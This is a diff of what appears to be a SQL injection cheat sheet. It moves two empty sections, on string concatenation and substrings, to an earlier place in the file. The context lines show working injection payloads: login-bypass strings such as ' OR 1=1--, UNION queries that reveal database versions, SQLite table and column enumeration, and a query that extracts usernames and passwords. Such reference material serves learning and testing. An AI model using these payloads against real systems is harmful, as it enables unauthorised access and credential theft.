@@ -4,6 +4,21 @@
 ● ' OR 1=1--                    : closes the current string ('), injects an always-true condition (OR 1=1), and comments out the remaining query (--)
 ● admin'--                      : uses admin as the username, closes the current string ('), and comments out the rest of the query (--)
 ```
+### Basic String Operations
+#### String Concantenation
+```
+● MySQL / Microsoft SQL Server  : 
+● Oracle                        : 
+● PostgreSQL                    : 
+● SQLite                        : 
+```
+#### Substring
+```
+● MySQL / Microsoft SQL Server  :
+● Oracle                        :
+● PostgreSQL                    : 
+● SQLite                        :
+```
 ### UNION-Based SQLI
 #### Column Count Determination
 ```
@@ -16,13 +31,6 @@
 ● Oracle                        : ' UNION SELECT BANNER, NULL FROM v$version-- 
 ● PostgreSQL                    : ' UNION SELECT version(), NULL-- 
 ● SQLite                        : ' UNION SELECT sqlite_version(), NULL-- 
-```
-#### String Concantenation
-```
-● MySQL / Microsoft SQL Server  : 
-● Oracle                        : 
-● PostgreSQL                    : 
-● SQLite                        : 
 ```
 #### Database Contents
 ```
@@ -39,11 +47,4 @@
                                     (it filters out SQLite's internal metadata tables)
                                   ' UNION SELECT name FROM pragma_table_info('put_table_name_here')--
                                   ' UNION SELECT put_username_here, put_password_here FROM put_table_name_here--
-```
-#### Substring
-```
-● MySQL / Microsoft SQL Server  :
-● Oracle                        :
-● PostgreSQL                    : 
-● SQLite                        :
 ```
